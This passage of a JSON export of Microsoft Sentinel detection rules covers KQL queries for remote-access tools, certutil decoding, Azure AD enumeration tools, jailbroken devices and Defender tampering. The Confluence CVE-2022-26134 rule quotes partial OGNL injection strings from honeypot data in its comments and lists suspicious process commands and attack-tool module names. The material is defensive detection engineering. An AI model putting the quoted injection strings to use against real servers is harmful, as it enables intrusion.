isfuzzy = true\n(\nfind in (DeviceImageLoadEvents, DeviceEvents, DeviceFileEvents, DeviceImageLoadEvents)\n    where FileName has_any (files)\n)\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | extend ProcessDetails = pack(\"FileName\", FileName, \"FolderPath\",FolderPath,\"InitiatingProcessCommandLine\", InitiatingProcessCommandLine)\n    | summarize min(TimeGenerated), max(TimeGenerated), make_set(ProcessDetails) by DeviceName, UserPrincipalName, InitiatingProcessAccountName, MachineGroup\n    )","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl","Execution","Persistence"],"techniques":["T1219","T1133","T1505"],"displayName":"BAH_Remote_Software","enabled":true,"description":"Software used for remote meetings or remote interaction. Remote Access and Meeting tools not approved by DISA https://aplits.disa.mil/processAPList.action\nFalse Positives: If another application uses a similar named DLL or exe\nPLATFORM:Windows\nMITRE:TA0003;T1133;T1505,TA0011;T1219","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-21T17:12:08.4361006Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5dc1c7a9-b865-4e50-85b9-0f4145bd6242","name":"5dc1c7a9-b865-4e50-85b9-0f4145bd6242","etag":"\"870090fd-0000-2700-0000-66fdcc570000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Michael Gibbs\r\n// Description: Microsoft's Certutil and Copy utility can be used to decode encoded files to run an executable or dll\r\n// False Positives: Forensics team certutil decode and encode for iocs.\r\nlet signInLookup = (\r\nSigninLogs\r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\r\n);\r\n(union isfuzzy = true\r\n    (\r\n    union withsource = TableName DeviceImageLoadEvents, DeviceFileEvents \r\n    | where ((InitiatingProcessFileName == \"certutil.exe\" and InitiatingProcessCommandLine contains \"decode\") // looks for certutil decode events\r\n    and (not(InitiatingProcessCommandLine has_any(@\".p7b\",@\".crl\") or FileName endswith @\".crl\"))) // but not when used to decode certs\r\n    or  ( InitiatingProcessCommandLine contains @\"copy /b\") // looks for copy /b commands\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, UserDisplayName, InitiatingProcessCommandLine\r\n    )\r\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1140"],"displayName":"BAH_Decode_Files","enabled":true,"description":"Microsoft's Certutil and Copy utility can be used to decode encoded files to run an executable or dll. Certutil can be used to encode files so that the hash and malicious content inside of the file isn't easily readable by defenders and anti-virus software. \nPLATFORM:Windows\nMITRE:TA0005;T1140","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:42:30.0884203Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/32c8037b-1c6b-4ac6-83a2-609a1794beb2","name":"32c8037b-1c6b-4ac6-83a2-609a1794beb2","etag":"\"8700a58b-0000-2700-0000-66fdc4cc0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Ginna Woo\r\n//Description: This UEBA analytic looks at all Service Principal Activities to identify potential risky Service Principal behaviors. \r\n//False Positive(s): None known\r\n\r\n//looks for ALL service principal activities in the AL table\r\nlet AL = AuditLogs \r\n| where ActivityDisplayName has \"service principal\" \r\n| where Result == \"success\"\r\n| extend AppID = tostring(AdditionalDetails[1].value)\r\n| extend creationTime = ActivityDateTime\r\n| extend userPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\r\n| extend ServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\r\n| extend ServicePrincipalName = tostring(InitiatedBy.app.displayName)\r\n| extend ipAddress_creator = tostring(InitiatedBy.user.ipAddress)\r\n| extend targetedResource = tostring(TargetResources.[0].displayName)\r\n| extend targetedResourceID = tostring(TargetResources.[0].id)\r\n| extend targetedResourceType = tostring(TargetResources.[0].type)\r\n| extend targetedUserName = tostring(TargetResources.[0].userPrincipalName)\r\n| project TimeGeneratedAL = TimeGenerated, AppID, userPrincipalName, ServicePrincipalId, ServicePrincipalName, OperationName, targetedResource, targetedResourceID, targetedResourceType, targetedUserName, Category, ResultDescription, CorrelationId, Resource, Identity, ResultReason, Result, ActivityDisplayName, AADOperationType;\r\n//Grabs IPs from AADServicePrincipalSignInLogs\r\nlet ServicePrincipal = AADServicePrincipalSignInLogs\r\n//| extend Ips = pack(\"IpAddress\", IPAddress)\r\n| extend AppID = AppId\r\n| distinct IPAddress, AppID, ServicePrincipalId, ServicePrincipalName\r\n| summarize make_list(IPAddress) by AppID, ServicePrincipalId, ServicePrincipalName;\r\n//grabbing enriching data (ActivityInsight col) from BA table\r\nlet BA = BehaviorAnalytics \r\n| extend userPrincipalName = UserPrincipalName \r\n| evaluate bag_unpack(ActivityInsights, columnsConflict=\"replace_source\") \r\n| extend ActionUncommonlyPerformedByUser = column_ifexists(\"ActionUncommonlyPerformedByUser\",\"\")\r\n| where tostring(ActionUncommonlyPerformedByUser)==True //added extra filter \r\n| project-away Type, DevicesInsights, UsersInsights, SourceIPAddress, UserName, TimeProcessed, TenantId, SourceRecordId;\r\n//joins AL + ServicePrincipal tables together \r\nlet AL1 = AL \r\n| join kind=inner (ServicePrincipal) on AppID\r\n| extend ServicePrincipalName = coalesce(ServicePrincipalName1, ServicePrincipalName), ServicePrincipalId = coalesce(ServicePrincipalId1, ServicePrincipalId) \r\n| project-away ServicePrincipalId1, ServicePrincipalName1, Result, AppID1, Resource, CorrelationId, Category, targetedResourceType\r\n| summarize AADOperationType = any(AADOperationType), IPAddresses= any(list_IPAddress), \r\n    any(targetedUserName) by TimeGeneratedAL, userPrincipalName, AppID, ServicePrincipalName, OperationName, targetedResourceID ;\r\n//joins AL1 with BehaviorAnalytics table \r\n  BA \r\n  | join kind=innerunique AL1 on userPrincipalName \r\n  | project-away UserPrincipalName, TimeGenerated, ActionType, ActivityType, userPrincipalName1, EventSource, SourceSystem\r\n  | project-rename TimeGenerated = TimeGeneratedAL, UserPrincipalName = userPrincipalName\r\n  | project-reorder TimeGenerated, UserPrincipalName, InvestigationPriority, ServicePrincipalName, OperationName, targetedResourceID\r\n  | where InvestigationPriority >= 0\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddresses"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1098","T0859"],"displayName":"BAH_UEBA_4-ServicePrincipalActivities","enabled":true,"description":"This UEBA analytic looks at all Service Principal Activities to identify potential risky Service Principal behaviors.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0004;T1098;T1098.001;T1098.003;T1098.005,TA0005;T1548;T1548.005,TA0007;T1087;T1087.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:10:19.1766949Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/dd87bdb3-e9b6-4323-8a5e-08e68721c543","name":"dd87bdb3-e9b6-4323-8a5e-08e68721c543","etag":"\"88003707-0000-2700-0000-66fdccff0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Michael Gibbs\n// Description: Azure AD Enumeration scripts ran to discover users and group permissions.\n// False Positives: N/A\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nlet Module = dynamic([@\"Get-AADIntAzureTenants\",\n@\"Invoke-AADIntReconAsInsider\",\n@\"Get-AADIntCache\",\n@\"Get-AADIntAccessTokenForAADGraph\",\n@\"Get-AADIntAccessToken\",\n@\"Invoke-AADIntUserEnumerationAsOutsider\",\n@\"Invoke-AADIntReconAsGuest\",\n@\"Get-AADIntAccessTokenForAzureCoreManagement\",\n@\"Call-AzureAADIAMAPI\",\n@\"Invoke-AADIntUserEnumerationAsInsider\",\n@\"Invoke-AADIntUserEnumerationAsGuest\",\n@\"Connect-AADUser\",\n@\"Get-AzureGraphToken\",\n@\"Invoke-AzureHound\",\n@\"Get-AzRoleAssignment\",\n@\"Get-AzureServicePrincipal\",\n@\"Select-AzSubscription\",\n@\"Get-Azroleassignment\",\n@\"Get-MsolRoleMember\"\n]);\nDeviceEvents\n| where AdditionalFields has_any (Module)\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, UserDisplayName, Module","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Discovery"],"techniques":["T1087"],"displayName":"BAH_AZURE_AD_ENUM","enabled":true,"description":"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Adversaries can use enumeration in order to build out a list of valid users and connect as an external user.\nPLATFORM:Microsoft 365,Azure AD,IaaS\nMITRE:TA0007;T1087;T1087.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:45:16.3060406Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4abe89fc-8ccc-4f10-ac98-690415865cc7","name":"4abe89fc-8ccc-4f10-ac98-690415865cc7","etag":"\"8700de83-0000-2700-0000-66fdc46b0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\n//Description: Alerts on Jailbroken devices enrolled in Intune based on hardware serial number\n//False Positives: None known\nlet allowList = dynamic(['DMPWGJGEJF8J']); // serialNumber_s list to ignore\nIntuneManagedDevices_CL\n| where jailBroken_s == \"True\"\n| where not(serialNumber_s has_any (allowList))\n| summarize min(TimeGenerated), max(TimeGenerated)\n    by\n    userDisplayName_s,\n    managedDeviceName_s,\n    serialNumber_s,\n    jailBroken_s,\n    managedDeviceOwnerType_s,\n    manufacturer_s,\n    model_s","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"userDisplayName_s"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"managedDeviceName_s"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1200"],"displayName":"BAH_UEM_Jailbroken_Device","enabled":true,"description":"Alerts on jailbroken devices by manufacturer serial number using Intune\nPLATFORM:Windows\nMITRE:TA0001;T1200","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:08:42.8011481Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/082f703b-2a1a-4b27-b240-02831e95b7b8","name":"082f703b-2a1a-4b27-b240-02831e95b7b8","etag":"\"850013e5-0000-2700-0000-66fdac830000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet emailregex = @'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$';\nlet OfficeEvents = materialize(\n  OfficeActivity\n  | where isnotempty(UserId)\n  | where TimeGenerated >= ago(dt_lookBack)\n  | where UserId matches regex emailregex\n  | project-rename  OfficeActivity_TimeGenerated = TimeGenerated);\nlet OfficeActivityUPNs = OfficeEvents | distinct UserId = tolower(UserId) | summarize make_list(UserId);\nThreatIntelligenceIndicator\n| where isnotempty(EmailSenderAddress)\n| where TimeGenerated >= ago(ioc_lookBack)\n| where tolower(EmailSenderAddress) in (OfficeActivityUPNs)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\"\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (OfficeEvents) on $left.EmailSenderAddress == $right.UserId\n| where OfficeActivity_TimeGenerated < ExpirationDateTime\n| summarize OfficeActivity_TimeGenerated = arg_max(OfficeActivity_TimeGenerated, *) by IndicatorId, UserId\n| project OfficeActivity_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore, EmailSenderName, EmailRecipient, EmailSourceDomain, EmailSourceIpAddress, EmailSubject, FileHashValue, FileHashType, UserId, ClientIP, Operation, UserType, RecordType, OfficeWorkload, Parameters\n| extend Name = tostring(split(UserId, '@', 0)[0]), UPNSuffix = tostring(split(UserId, '@', 1)[0])\n| extend timestamp = OfficeActivity_TimeGenerated\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.2.6","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI map Email entity to OfficeActivity","enabled":true,"description":"Identifies a match in OfficeActivity table from any Email IOC from TI\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1566;T1566.002,TA0006;T1110;T1110.001;T1110.002;T1110.003;T1110.004","alertRuleTemplateName":"4a3f5ed7-8da5-4ce2-af6f-c9ada45060f2","lastModifiedUtc":"2024-10-02T20:26:37.1450241Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e2dcd5a3-1253-4a09-8dc1-07410c4e65f5","name":"e2dcd5a3-1253-4a09-8dc1-07410c4e65f5","etag":"\"8700b3b7-0000-2700-0000-66fdc7aa0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Michael Gibbs\n// Description: Azure AD Enumeration scripts ran to discover users and group permissions using python\n// False Positives: If a normal process starts connecting to Azure via python will need to change analytic\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nDeviceNetworkEvents\n| where RemoteUrl contains @\"graph.windows\" and InitiatingProcessFileName contains \"python\"\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project TimeGenerated, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, UserDisplayName,  InitiatingProcessParentFileName, InitiatingProcessFileName, RemoteUrl","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Discovery"],"techniques":["T1087"],"displayName":"BAH_ROADRECON","enabled":true,"description":"Python Azure AD Recon Module used to enumerate users and groups\nPLATFORM:Microsoft 365,Azure AD,IaaS,Windows\nMITRE:TA0007;T1087;T1087.001;T1087.002;T1087.003;T1087.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:22:32.5994924Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8c19c82c-fcd6-46b4-b2ce-56ee6a4a6e07","name":"8c19c82c-fcd6-46b4-b2ce-56ee6a4a6e07","etag":"\"88000201-0000-2700-0000-66fdcc900000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Rob Russell\n//Description:\n// https://isc.sans.edu/forums/diary/Atlassian+Confluence+Exploits+Seen+By+Our+Honeypots+CVE202226134/28722/\n// https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html\n// example attack strings based on honeypot data\n//%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%2\n// index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctr\n// False Positives: This could be triggered by scans looking for this vulnerability\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nlet CVEStrings = dynamic([\"org.apache.commons.io.IOUtils\", \"allowStaticMethodAccess\"]);\n(union isfuzzy=true(\n    DeviceNetworkEvents\n    | where isnotempty(RemoteUrl)\n    | where RemoteUrl has_any (\"org.apache.commons.io.IOUtils\", \"allowStaticMethodAccess\")\n    | extend RemoteUrl = iif(RemoteUrl contains '%', url_decode(RemoteUrl), RemoteUrl) // if url encoded, decode it\n    | extend First16Chars = substring(RemoteUrl, 0, 16)\n    | join kind=leftouter (\n    DeviceNetworkEvents\n        | extend First16Chars = substring(RemoteUrl, 0, 16)\n        | summarize make_set(RemoteUrl, 200) by First16Chars, InitiatingProcessId, DeviceName  \n    ) on $left.First16Chars == $right.First16Chars, $left.DeviceName == $right.DeviceName, $left.InitiatingProcessId == $right.InitiatingProcessId\n    | where array_length(set_RemoteUrl) < 100 // filters out  web scanning activity based on the number of urls coming from the same device and initiating process id and start of URL\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0]) // for sign in lookup by device, will find last user signed into device if it was in the last 24 hours\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        RemoteUrl,\n        LocalIP,\n        RemoteIP,\n        DeviceName,\n        UserPrincipalName,\n        InitiatingProcessAccountUpn,\n        InitiatingProcessAccountDomain    \n    ),\n    (DeviceProcessEvents\n    | where InitiatingProcessFolderPath endswith @\"\\Atlassian\\Confluence\\jre\\bin\\java.exe\"\n    | where ProcessCommandLine has_any (\"cmd /c\", \"cmd /k\", \"powershell\", \"certutil\", \"curl\", \"whoami\", \"ipconfig\")\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0]) // for signin lookup by device will find last user signed into device if it was in the last 24 hours\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        InitiatingProcessFolderPath,\n        ProcessCommandLine,\n        DeviceName,\n        UserPrincipalName,\n        AccountUpn,\n        AccountDomain\n    )\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"},{"identifier":"NTDomain","columnName":"AccountDomain"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"LocalIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","InitialAccess"],"techniques":["T1059","T1190"],"displayName":"BAH_Confluence_CVE-2022-26134","enabled":true,"description":"Detects URLs and process activity related to remote code execution vulnerability in Confluence CVE-2022-26134\n\nPLATFORM:Windows\nMITRE:TA0001;T1190,TA0002;T1059;T1059.009","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:43:27.7956732Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/006af3f1-d3ce-4331-8597-4d56785db78c","name":"006af3f1-d3ce-4331-8597-4d56785db78c","etag":"\"3d00a762-0000-2700-0000-64e75c980000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"//Title: BAH_TamperProtectionDetection\n//Description: Looks in the DeviceEvents table for any instance of 'TamperingAttempt' via ActionType. \n//This will ignore attempts from McAfee to disable MDE via mfetp.exe\n//Authors: Steven Wan, Rob Russell, Michael Gibbs\n//False Positives: None applicable at this time.\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nlet detectMcAfee = (\nDeviceEvents\n| where InitiatingProcessFileName == \"mfetp.exe\"\n| project TimeGenerated, DeviceName, ProcessId, InitiatingProcessFileName\n);\nDeviceEvents\n| where ActionType contains \"TamperingAttempt\"\n| extend AdditionalFields = todynamic(AdditionalFields)\n| extend TamperingAction = tostring(AdditionalFields.['TamperingAction'])\n| extend Status = tostring(AdditionalFields.['Status'])\n| extend Target = tostring(AdditionalFields.['Target'])\n| extend TargetProperty = replace_regex(Target,@\"(.*)\\\\(.*)\",@\"\\2\")\n| extend OriginalValue = tostring(AdditionalFields.['OriginalValue'])\n| extend TamperingAttemptedValue = tostring(AdditionalFields.['TamperingAttemptedValue'])\n// For ThreatSeverityDefaultAction ignore changes made by GPO or Endpoint configuration manager (SCCM)\n| where ( TargetProperty startswith \"Disable\" and TamperingAttemptedValue == 1 ) or ( ( Target contains \"ThreatSeverityDefaultAction\" ) and ( InitiatingProcessCommandLine !in (\"svchost.exe -k GPSvcGroup\",\"svchost.exe -k netsvcs -p -s gpsvc\") and InitiatingProcessFolderPath != @\"C:\\Windows\\System32\" ) and ( InitiatingProcessCommandLine != \"CcmExec.exe\" and InitiatingProcessFolderPath == @\"C:\\Windows\\CCM\" ))\n| where Status != \"Ignored\"\n| extend TargetProperty = iff( ( TargetProperty matches regex @\"\\d\" ), strcat(\"ThreatSeverityDefaultAction-\",TargetProperty), TargetProperty)\n| join kind=leftouter detectMcAfee on $left.InitiatingProcessParentId == $right.ProcessId, $left.DeviceName == $right.DeviceName\n| where not (InitiatingProcessFileName1 == \"mfetp.exe\") // if McAfee tried to disable MDE ignore\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0]) // for signin lookup by device will find last user signed into device if it was in the last 24 hours\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI // this join will add UserPrincipalName from here forward based on device name\n| project TimeGenerated, DeviceName, TamperingAction, Status, TargetProperty, OriginalValue, TamperingAttemptedValue, InitiatingProcessCommandLine, InitiatingProcessAccountName, InitiatingProcessAccountSid, ReportId, DeviceId\n| sort by TimeGenerated desc\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"BAH_TamperProtectionDetection","enabled":false,"description":"Looks in the DeviceEvents table for any instance of 'TamperingAttempt' via ActionType.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-08-24T13:35:20.1729196Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7a9eaa37-befd-4b4f-9610-4f35369707da","name":"7a9eaa37-befd-4b4f-9610-4f35369707da","etag":"\"8600d4af-0000-2700-0000-66fdb6e10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let known_locations = (\n  AADServicePrincipalSignInLogs\n  | where TimeGenerated between(ago(14d)..ago(1d))\n  | where ResultType == 0\n  | summarize by Location);\n  AADServicePrincipalSignInLogs\n  | where TimeGenerated > ago(1d)\n  | where ResultType != 50126\n  | where Location !in (known_locations)\n  | extend City = tostring(parse_json(LocationDetails).city)\n  | extend State = tostring(parse_json(LocationDetails).state)\n  | extend Place = strcat(City, \" - \", State)\n  | extend Result = strcat(tostring(ResultType), \" - \", ResultDescription)\n  | summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), make_set(Result), make_set(IPAddress), make_set(Place) by ServicePrincipalName, 